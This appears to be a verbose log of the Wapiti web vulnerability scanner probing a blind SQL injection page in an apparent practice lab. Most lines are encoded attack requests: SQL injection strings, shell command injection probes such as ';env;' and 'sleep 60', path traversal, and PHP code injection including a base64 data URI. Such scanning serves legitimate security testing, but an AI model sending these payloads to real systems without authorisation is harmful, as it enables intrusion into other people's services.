2024-03-20 12:44:11.529 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit (0)
2024-03-20 12:44:11.629 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit (1)
2024-03-20 12:44:11.630 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/vulnerabilities/sqli_blind/ (1)
2024-03-20 12:44:11.741 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
2024-03-20 12:44:11.741 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_f7d9bfa2.db
2024-03-20 12:44:11.744 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 3 URLs and forms during the scan
2024-03-20 12:44:11.783 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
2024-03-20 12:44:11.783 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
2024-03-20 12:44:11.910 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
2024-03-20 12:44:11.910 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
2024-03-20 12:44:11.910 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
2024-03-20 12:44:11.924 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit (0)
2024-03-20 12:44:11.925 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%C2%BF%27%22%28&Submit=Submit (0)
2024-03-20 12:44:11.937 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=fuzz%C2%BF%27%22%28 (0)
2024-03-20 12:44:11.966 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%20AND%2065%3D104%20AND%2080%3D80&Submit=Submit (0)
2024-03-20 12:44:11.985 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%27%20AND%2034%3D76%20AND%20%2747%27%3D%2747&Submit=Submit (0)
2024-03-20 12:44:12.002 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%22%20AND%2015%3D84%20AND%20%2212%22%3D%2212&Submit=Submit (0)
2024-03-20 12:44:12.022 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%29%20AND%2042%3D82%20AND%20%2882%3D82&Submit=Submit (0)
2024-03-20 12:44:12.040 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%27%29%20AND%2039%3D55%20AND%20%28%2726%27%3D%2726&Submit=Submit (0)
2024-03-20 12:44:12.057 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%22%29%20AND%2069%3D152%20AND%20%28%2294%22%3D%2294&Submit=Submit (0)
2024-03-20 12:44:12.072 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%20AND%2076%3D160%20AND%2070%3D70 (0)
2024-03-20 12:44:12.088 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%27%20AND%2088%3D139%20AND%20%2774%27%3D%2774 (0)
2024-03-20 12:44:12.103 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%22%20AND%2037%3D100%20AND%20%2234%22%3D%2234 (0)
2024-03-20 12:44:12.120 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%29%20AND%2034%3D90%20AND%20%2844%3D44 (0)
2024-03-20 12:44:12.135 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%27%29%20AND%2014%3D40%20AND%20%28%2751%27%3D%2751 (0)
2024-03-20 12:44:12.152 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%22%29%20AND%2050%3D124%20AND%20%28%2216%22%3D%2216 (0)
2024-03-20 12:44:12.176 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit (1)
2024-03-20 12:44:12.177 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%C2%BF%27%22%28 (1)
2024-03-20 12:44:12.199 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default%20AND%2048%3D79%20AND%2062%3D62&Submit=Submit (1)
2024-03-20 12:44:12.216 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default%27%20AND%2025%3D107%20AND%20%2796%27%3D%2796&Submit=Submit (1)
2024-03-20 12:44:12.233 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default%22%20AND%2098%3D152%20AND%20%2265%22%3D%2265&Submit=Submit (1)
2024-03-20 12:44:12.253 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default%29%20AND%2032%3D78%20AND%20%2843%3D43&Submit=Submit (1)
2024-03-20 12:44:12.270 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default%27%29%20AND%2074%3D133%20AND%20%28%2749%27%3D%2749&Submit=Submit (1)
2024-03-20 12:44:12.287 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default%22%29%20AND%2028%3D112%20AND%20%28%2274%22%3D%2274&Submit=Submit (1)
2024-03-20 12:44:12.302 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%20AND%2026%3D84%20AND%2090%3D90 (1)
2024-03-20 12:44:12.318 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%27%20AND%2084%3D152%20AND%20%2742%27%3D%2742 (1)
2024-03-20 12:44:12.335 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%22%20AND%2046%3D56%20AND%20%2241%22%3D%2241 (1)
2024-03-20 12:44:12.354 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%29%20AND%2043%3D116%20AND%20%2857%3D57 (1)
2024-03-20 12:44:12.370 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%27%29%20AND%2065%3D160%20AND%20%28%2793%27%3D%2793 (1)
2024-03-20 12:44:12.386 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%22%29%20AND%2036%3D60%20AND%20%28%2269%22%3D%2269 (1)
2024-03-20 12:44:12.411 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/sqli_blind/ (1)
2024-03-20 12:44:12.453 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
2024-03-20 12:44:12.465 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit (0)
2024-03-20 12:44:12.466 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=%3Benv%3B&Submit=Submit (0)
2024-03-20 12:44:12.480 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=%7Cenv%7C&Submit=Submit (0)
2024-03-20 12:44:12.494 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=a%3Benv%3B&Submit=Submit (0)
2024-03-20 12:44:12.507 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=a%3Benv%3B&Submit=Submit (0)
2024-03-20 12:44:12.521 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&Submit=Submit (0)
2024-03-20 12:44:12.535 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%3Benv%3B&Submit=Submit (0)
2024-03-20 12:44:12.546 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%0Aenv%3B&Submit=Submit (0)
2024-03-20 12:44:12.559 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=%26set%26&Submit=Submit (0)
2024-03-20 12:44:12.569 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=set&Submit=Submit (0)
2024-03-20 12:44:12.580 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=env&Submit=Submit (0)
2024-03-20 12:44:12.590 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=%2Fe%00&Submit=Submit (0)
2024-03-20 12:44:12.604 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&Submit=Submit (0)
2024-03-20 12:44:12.617 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&Submit=Submit (0)
2024-03-20 12:44:12.629 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&Submit=Submit (0)
2024-03-20 12:44:12.639 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&Submit=Submit (0)
2024-03-20 12:44:12.650 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&Submit=Submit (0)
2024-03-20 12:44:12.661 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&Submit=Submit (0)
2024-03-20 12:44:12.672 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&Submit=Submit (0)
2024-03-20 12:44:12.681 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&Submit=Submit (0)
2024-03-20 12:44:12.692 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&Submit=Submit (0)
2024-03-20 12:44:12.701 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&Submit=Submit (0)
2024-03-20 12:44:12.710 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&Submit=Submit (0)
2024-03-20 12:44:12.719 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&Submit=Submit (0)
2024-03-20 12:44:12.728 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&Submit=Submit (0)
2024-03-20 12:44:12.740 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=a%60%29%60&Submit=Submit (0)
2024-03-20 12:44:12.751 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=a%60sleep%2060%60&Submit=Submit (0)
2024-03-20 12:44:12.762 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=a%3Bsleep%2060%3B&Submit=Submit (0)
2024-03-20 12:44:12.771 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=a%7Csleep%2060%3B&Submit=Submit (0)
2024-03-20 12:44:12.780 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=%26ping%20-n%2025%20127.0.0.1%26&Submit=Submit (0)
2024-03-20 12:44:12.791 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=%3Benv%3B (0)
2024-03-20 12:44:12.804 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=%7Cenv%7C (0)
2024-03-20 12:44:12.815 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=a%3Benv%3B (0)
2024-03-20 12:44:12.828 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=a%3Benv%3B (0)
2024-03-20 12:44:12.840 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C (0)
2024-03-20 12:44:12.850 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%3Benv%3B (0)
2024-03-20 12:44:12.863 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%0Aenv%3B (0)
2024-03-20 12:44:12.875 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=%26set%26 (0)
2024-03-20 12:44:12.884 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=set (0)
2024-03-20 12:44:12.894 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=env (0)
2024-03-20 12:44:12.902 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=%2Fe%00 (0)
2024-03-20 12:44:12.911 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 12:44:12.920 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 12:44:12.929 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 12:44:12.937 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 12:44:12.946 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 12:44:12.955 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 12:44:12.967 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 12:44:12.977 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 12:44:12.985 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 12:44:12.994 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 12:44:13.003 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 12:44:13.013 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 12:44:13.022 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D (0)
2024-03-20 12:44:13.033 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=a%60%29%60 (0)
2024-03-20 12:44:13.043 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=a%60sleep%2060%60 (0)
2024-03-20 12:44:13.055 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=a%3Bsleep%2060%3B (0)
2024-03-20 12:44:13.067 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=a%7Csleep%2060%3B (0)
2024-03-20 12:44:13.077 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=%26ping%20-n%2025%20127.0.0.1%26 (0)
2024-03-20 12:44:13.092 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit (1)
2024-03-20 12:44:13.094 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=%3Benv%3B (1)
2024-03-20 12:44:13.104 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=%7Cenv%7C (1)
2024-03-20 12:44:13.114 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=a%3Benv%3B (1)
2024-03-20 12:44:13.122 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=a%3Benv%3B (1)
2024-03-20 12:44:13.131 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C (1)
2024-03-20 12:44:13.141 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%3Benv%3B (1)
2024-03-20 12:44:13.153 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%0Aenv%3B (1)
2024-03-20 12:44:13.163 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=%26set%26 (1)
2024-03-20 12:44:13.171 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=set (1)
2024-03-20 12:44:13.180 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=env (1)
2024-03-20 12:44:13.188 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=%2Fe%00 (1)
2024-03-20 12:44:13.197 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
2024-03-20 12:44:13.205 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
2024-03-20 12:44:13.214 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
2024-03-20 12:44:13.225 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
2024-03-20 12:44:13.234 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
2024-03-20 12:44:13.242 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
2024-03-20 12:44:13.252 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
2024-03-20 12:44:13.262 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
2024-03-20 12:44:13.270 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
2024-03-20 12:44:13.278 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
2024-03-20 12:44:13.287 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
2024-03-20 12:44:13.298 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
2024-03-20 12:44:13.306 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D (1)
2024-03-20 12:44:13.315 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=a%60%29%60 (1)
2024-03-20 12:44:13.323 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=a%60sleep%2060%60 (1)
2024-03-20 12:44:13.332 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=a%3Bsleep%2060%3B (1)
2024-03-20 12:44:13.340 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=a%7Csleep%2060%3B (1)
2024-03-20 12:44:13.349 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=%26ping%20-n%2025%20127.0.0.1%26 (1)
2024-03-20 12:44:13.363 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/sqli_blind/ (1)
2024-03-20 12:44:13.388 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
2024-03-20 12:44:13.402 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit (0)
2024-03-20 12:44:13.410 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
2024-03-20 12:44:13.495 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
2024-03-20 12:44:13.506 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit (0)
2024-03-20 12:44:13.533 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit (1)
2024-03-20 12:44:13.552 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/sqli_blind/ (1)
2024-03-20 12:44:13.567 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
2024-03-20 12:44:13.580 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit (0)
